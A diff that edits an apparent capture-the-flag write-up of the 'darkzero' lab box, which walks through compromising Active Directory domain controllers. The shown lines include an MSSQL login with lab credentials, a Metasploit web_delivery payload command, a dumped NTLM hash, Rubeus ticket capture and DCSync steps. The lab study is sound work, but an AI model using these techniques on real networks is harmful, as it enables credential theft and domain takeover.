@@ -29,7 +29,6 @@ created: 2025-10-08
 - Kernel exploit
 - Two domains
 - Internal network machine
-- `DC01` machine user account's `TGT` extraction using `Rubeus`, forcing `DC01` to authenticate to our compromised `DC02`
 - `DCSync`
 
 **🛠️ Tools:**  
@@ -48,16 +47,12 @@ created: 2025-10-08
 - `Rubeus` monitor to extract `TGT`s.
 - Convert `.kirbi` into `.ccache` using `impacket-ticketConverter`.
 - Log in with `impacket` tools using `Kerberos` with `-k` and `-no-pass`, exporting the `KRB5CCNAME` environment variable.
-- `KRB5CCNAME` doesn't need to be an absolute path.
-- The Domain Controller's machine user account (e.g. `DC01$`) can do `DCSync`. If we get its ticket, we can use it to authenticate via `Kerberos` and do `DCSync`.
-- The hints I read said pivoting was required, but I didn't need it.
 
 ----
 
 ## 🌐 Port Scan
 
 - **TCP**: 53, 88, 135, 139, 389, 445, 464, 593, 636, 1433, 5985, ...
-- **UDP**: None
 
 ---
 
@@ -69,7 +64,7 @@ This box is from an assumed breach perspective. The domain user they give us is:
 
 I found some interesting ports, and judging from some of them we are facing a Domain Controller. The `nmap` scan and `NetExec` reveal that the domain is `darkzero.htb`.
 
-I used my `test-services` script and found that our user has access to `mssql` (apart from `SMB` and `LDAP`). I quickly logged in with `impacket-mssqlclient`.
+I found that our user has access to `mssql` (apart from `SMB` and `LDAP`). I logged in with `impacket-mssqlclient`.
 
 ```shell
 impacket-mssqlclient darkzero.htb/john.w:'RFulUtONCOL!'@10.10.11.89 -windows-auth
@@ -116,12 +111,12 @@ darkzero-ext\svc_sql
 Got `RCE` on `DC02.darkzero.ext`.
 
 >[!tip]
->Use double quotes for hostnames with dots (`.`) on them. Use double quotes for strings when using `impacket-mssqlclient`.
+>Use double quotes for hostnames with dots (`.`) on them.
 
 I decided to get a `meterpreter` shell as it could probably make this easier. I used the web delivery module.
 
 >[!warning]
->`penelope`'s upload and download functions didn't work here. It may have to do with the routing, as `DC02` is on the internal network (`172.16.20.0/24`) and we can access it only using `DC01`.
+>`penelope`'s upload and download functions didn't work here. It may have to do with the routing, as `DC02` is on the internal network (`172.16.20.0/24`) and we can access it only by routing through `DC01`.
 
 ```
 $ msfconsole -q -x "use exploit/multi/script/web_delivery; \
@@ -249,7 +244,7 @@ C:\Users\Administrator\Desktop>dir
                2 Dir(s)   3,347,607,552 bytes free
 ```
 
-Got user. Yes, `user.txt` was on the administrator's desktop on `DC02.darkzero.ext`.
+Got user. `user.txt` was on the administrator's desktop on `DC02.darkzero.ext`.
 
 I also ran `hashdump` and saved the output just in case.
 
@@ -267,16 +262,11 @@ darkzero$:1105:aad3b435b51404eeaad3b435b51404ee:4276fdf209008f4988fa8c33d65a2f94
 
 ## 🛡️ Privilege Escalation
 
-There must be something we can do with administrator on this machine to get to `DC01`. I ran `BloodHound` (it would have worked from the beginning, but it wasn't relevant until now).
+We have a trust from `darkzero.ext` to `darkzero.htb`. We already compromised `darkzero.ext`, and our goal is to compromise `darkzero.htb`.
 
 ![[Pasted image 20251008224054.png]]
 
-We have a trust from `darkzero.ext` to `darkzero.htb`. We already compromised `darkzero.ext`, and our goal is to compromise `darkzero.htb`.
-
 I got stuck here and needed several hints. The solution involves forcing `DC01` to authenticate to our compromised `DC02` and capture the machine account's `TGT`, which can be used to perform a `DCSync` attack.
-
->[!tip]
->Domain Controller machine accounts can perform `DCSync`.
 
 I uploaded `Rubeus.exe` from our `NT AUTHORITY\SYSTEM` session and ran the following command:
 
@@ -321,7 +311,6 @@ We have to fix the clock skew or the `DCSync` will fail.
 
 ```shell
 $ sudo timedatectl set-ntp off
-
 $ sudo rdate -n 10.10.11.89
 Thu Oct  9 06:06:33 -05 2025
 ```
